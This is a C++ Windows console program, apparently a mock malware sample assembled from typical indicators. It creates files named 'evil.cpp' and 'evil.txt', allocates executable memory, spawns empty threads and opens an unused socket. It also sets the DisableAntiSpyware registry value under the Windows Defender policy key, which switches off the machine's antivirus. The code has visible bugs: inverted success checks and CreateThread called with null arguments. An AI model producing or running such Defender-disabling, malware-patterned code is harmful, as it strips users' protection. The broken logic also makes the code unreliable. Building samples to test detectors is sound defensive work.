// ExeFiles.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <windows.h>
#include <iostream>
#include <map>
#include <string>
#include <cstring>
#include <vector>
#include <iterator>
#include <algorithm>
#include <fstream>
#include <stdio.h>
#include <stdlib.h>
#include <cstring>
#include <sstream>
#include <winsock.h>
using std::ostringstream;
using std::ends;
#pragma comment(lib,"ws2_32.lib")


int main()
{

    Sleep(2000);

    HANDLE hFile = CreateFileA("evil.cpp",                // name of the write
    GENERIC_WRITE,          // open for writing
    0,                      // do not share
    NULL,                   // default security
    CREATE_NEW,             // create new file only
    FILE_ATTRIBUTE_NORMAL,  // normal file
    NULL);                  // no attr. template

    if (!(hFile == INVALID_HANDLE_VALUE))
        printf("Could not open file\n");
    else
        printf("Successfully opened file\n");

    LPVOID address = VirtualAlloc(NULL, 11, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    hFile = CreateFileA("evil.txt",                // name of the write
    GENERIC_WRITE,          // open for writing
    0,                      // do not share
    NULL,                   // default security
    CREATE_NEW,             // create new file only
    FILE_ATTRIBUTE_NORMAL,  // normal file
    NULL);                  // no attr. template

    if (!(hFile == INVALID_HANDLE_VALUE))
        printf("Could not open file\n");
    else
        printf("Successfully opened file\n");

    address = VirtualAlloc(NULL, 11, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    CreateThread(NULL, NULL, NULL, NULL, NULL, NULL);
    CreateThread(NULL, NULL, NULL, NULL, NULL, NULL);

    HKEY key;
    HKEY new_key;
    DWORD disable = 1;
    LONG res = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key);
    RegSetValueExA(key, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegCreateKeyExA(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);



    //Start up Winsock…
    WSADATA wsadata;
    SOCKET s;

    int error = WSAStartup(0x0202, &wsadata);

    //Did something happen?
    if (error)
        return false;

    //Did we get the right Winsock version?
    if(wsadata.wVersion != 0x0202)
    {
        WSACleanup(); //Clean up Winsock
        return false;
    }


    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("Could not create socket : %d", WSAGetLastError());
    }

    printf("Socket created.\n");
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
